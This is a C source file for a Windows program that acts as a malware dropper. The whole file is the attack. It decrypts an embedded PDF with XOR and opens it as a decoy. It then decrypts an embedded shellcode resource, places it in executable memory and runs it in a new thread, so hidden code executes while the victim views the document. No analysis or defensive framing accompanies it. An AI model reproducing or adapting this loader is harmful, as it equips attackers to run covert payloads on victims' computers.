#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <shlwapi.h>

#define SHELLCODE_ID 101
#define PDF_ID 102

#pragma comment(lib, "shlwapi.lib")

void xorDecrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] = data[i] ^ key;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char xorKey = 0xff;
    // Write the PDF from pdf.h to a file after decrypting it

    HRSRC hPDFRes = FindResource(hInstance, MAKEINTRESOURCE(PDF_ID), TEXT("RT_STRING"));
    if (hPDFRes) {
        HGLOBAL hPDFData = LoadResource(hInstance, hPDFRes);
        if (hPDFData) {
            DWORD pdfSize = SizeofResource(hInstance, hPDFRes);
            void* pdfData = LockResource(hPDFData);
            if (pdfData) {
                unsigned char* decryptedPDF = malloc(pdfSize);
                if (decryptedPDF) {
                    memcpy(decryptedPDF, pdfData, pdfSize);
                    xorDecrypt(decryptedPDF, pdfSize, xorKey);
                    // Write the decrypted PDF data to the file
                    TCHAR modulePath[MAX_PATH];
                    if (GetModuleFileName(NULL, modulePath, MAX_PATH) != 0) {
                        // Remove the module filename from the path
                        PathRemoveFileSpec(modulePath);

                        // Combine the path with the PDF file name
                        TCHAR pdfPath[MAX_PATH];
                        if (PathCombine(pdfPath, modulePath, TEXT("file.pdf")) != NULL) {
                            // Create a file handle for writing
                            HANDLE hFile = CreateFile(pdfPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                // Write the decrypted PDF data to the file
                                DWORD bytesWritten;
                                if (WriteFile(hFile, decryptedPDF, pdfSize, &bytesWritten, NULL) && bytesWritten == pdfSize) {
                                    // File writing succeeded
                                    ShellExecute(NULL, TEXT("open"), pdfPath, NULL, NULL, SW_SHOWNORMAL);
                                }
                                else {
                                }
                                CloseHandle(hFile);
                            }
                            else {
                            }
                        }
                        else {
                        }
                    }
                    else {
                    }
                    free(decryptedPDF);
                }
                else {
                }
            }
            else {
            }
            FreeResource(hPDFData);
        }
        else {
        }
    }
    else {
    }

HRSRC hShellcodeRes = FindResource(hInstance, MAKEINTRESOURCE(SHELLCODE_ID), TEXT("RT_STRING"));
    if (hShellcodeRes) {
        HGLOBAL hShellcodeData = LoadResource(hInstance, hShellcodeRes);
        if (hShellcodeData) {
            DWORD shellcodeSize = SizeofResource(hInstance, hShellcodeRes);
            void* shellcode = LockResource(hShellcodeData);
            if (shellcode) {
                xorDecrypt(shellcode, shellcodeSize, xorKey);
                HANDLE lpAddr = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (lpAddr) {
                    memcpy(lpAddr, shellcode, shellcodeSize);
                }
                else {
                }
                HANDLE hThread = CreateThread(NULL, 0, lpAddr, NULL, 0, NULL);
                if (hThread) {
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                } 
                else {
                }
            }
            else {
            }
            FreeResource(hShellcodeData);
        }
        else {
        }
    }
    else {
    }

    return 0;
}
